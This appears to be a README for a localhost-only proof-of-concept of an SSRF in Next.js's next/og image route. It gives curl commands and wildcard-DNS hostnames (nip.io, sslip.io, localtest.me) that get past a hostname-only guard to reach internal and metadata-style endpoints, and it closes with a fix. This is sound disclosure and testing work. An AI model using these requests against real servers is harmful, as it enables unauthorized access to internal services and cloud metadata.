# next/og SSRF — local live test (H7)

A complete, **localhost-only** reproduction you run against a real Next.js dev/prod server on your own machine. It proves that a public, unauthenticated `/api/og?img=<url>` endpoint can be made to fetch an internal-only address the framework's own "SSRF protection" guard is supposed to block, and that the internal content comes back to the caller.

Everything targets `127.0.0.1`. Nothing external is contacted. To point at real infrastructure you would edit one hostname — **don't**, unless it's your own and you're authorized.

## What's here
- `app/api/og/route.tsx` — a normal dynamic-OG route (`ImageResponse` rendering a request-supplied `?img=` URL). The only app-side precondition for the bug.
- `internal-server.mjs` — a loopback service standing in for cloud metadata / an internal panel. Returns a per-path "secret" image and logs every hit.
- `attack.mjs` — sends the unauthenticated request to your running Next server and prints a verdict (reach + content exfil + guard-active control).

## Requirements
- Node 18+ (uses the built-in global `fetch`).
- The `next` version you're reviewing (this `package.json` pins `next@canary`; change it to match your target). The bug is in the bundled `@vercel/og`, so any Next shipping that bundle is affected. Works in both `runtime = 'nodejs'` (default here) and `'edge'`.
- The attack uses a **hostname that resolves to loopback** as its SSRF vehicle (default `127.0.0.1.nip.io`, via the public [nip.io](https://nip.io) wildcard DNS). If your network blocks nip.io, `attack.mjs` says so in a DNS preflight and you pass another vehicle via `IMG_HOST` (see below). No literal IP and no `localhost` — the guard blocks those on purpose.

## Run it (3 terminals)
```bash
cd security-pocs/live-test
npm install                 # or pnpm/yarn/bun

# terminal 1 — the internal-only service (the SSRF target)
npm run internal            # listens on 127.0.0.1:8079

# terminal 2 — your Next app
npm run dev                 # http://localhost:3000   (or: npm run build && npm run start)

# terminal 3 — the attack
npm run attack
```

## Expected result
`attack.mjs` prints:
```
SSRF reach (og fetched the internal host)      : YES
Internal CONTENT exfiltrated to the attacker   : YES — RED vs BLUE runs returned different PNGs, ...
Guard blocks the literal-IP control            : YES (HTTP 500) — the guard is active, and the hostname bypasses it
```
and the **terminal 1** (internal service) log shows the Next server reaching `/latest/meta-data/red` and `/blue` — but **not** the literal-IP control. That is the SSRF: your public endpoint fetched an internal-only address chosen by the (unauthenticated) request.

### Or with curl
```bash
# guard-allowed hostname that resolves to loopback -> 200, internal service is hit
curl -s -o /tmp/a.png -w '%{http_code}\n' \
  "http://localhost:3000/api/og?img=http://127.0.0.1.nip.io:8079/latest/meta-data/red"
# literal IP -> 500 "Image source resolves to a blocked address (SSRF protection)"
curl -s -o /dev/null -w '%{http_code}\n' \
  "http://localhost:3000/api/og?img=http://127.0.0.1:8079/latest/meta-data/red"
```

## If nip.io is blocked on your network
`attack.mjs` runs a DNS preflight and prints what the vehicle resolves to. If it isn't loopback, swap the vehicle with `IMG_HOST` — any hostname that resolves to `127.0.0.1` works, as long as it is **not** a literal IP and does **not** end in `localhost`/`.local` (the guard blocks those):
```bash
IMG_HOST=localtest.me        npm run attack   # another public wildcard-DNS service
IMG_HOST=127-0-0-1.sslip.io  npm run attack   # sslip.io wildcard DNS
# fully offline — add one line to /etc/hosts, then:
#   127.0.0.1  internal.ssrf-poc.example
IMG_HOST=internal.ssrf-poc.example npm run attack
```

## Why it works
The shipped guard decides on the **hostname string alone and never resolves DNS**. It blocks literal private/loopback/metadata IPv4/IPv6, and the names `localhost`, `*.localhost`, `*.local` — but returns "not blocked" for every other hostname. So `127.0.0.1.nip.io` sails through the check, then DNS-resolves to `127.0.0.1` when satori actually fetches it. (The fetch also follows redirects with no per-hop re-check, so an allowed public host that `302`s to a private IP is reached too.) See `../SECURITY_REVIEW_canary_2026-09.md` (H7); the exact guard bytes are in `../_og_guard_extracted.mjs`.

## Scope / honesty
- Needs the app to render a **request-controlled** image URL (common dynamic-OG pattern; not every OG route).
- Internal endpoints that return an **image** are fully read (shown here); text/JSON endpoints (e.g. AWS IMDSv1) are **blind** (request fires, body not reflected). AWS IMDSv2/GCP/Azure metadata also need request headers satori doesn't send.

## Fix (turn the finding into a before/after test)
Route the `next/og` image fetch through the same defense `packages/next/src/server/image-optimizer.ts` (`fetchExternalImage`) already uses: resolve the hostname and reject if any resolved IP is private (`isPrivateIp`), use `redirect: 'manual'` and re-check each hop, and add a timeout + response-size cap. After that, `attack.mjs` should report **reach: no** for the hostname case too.
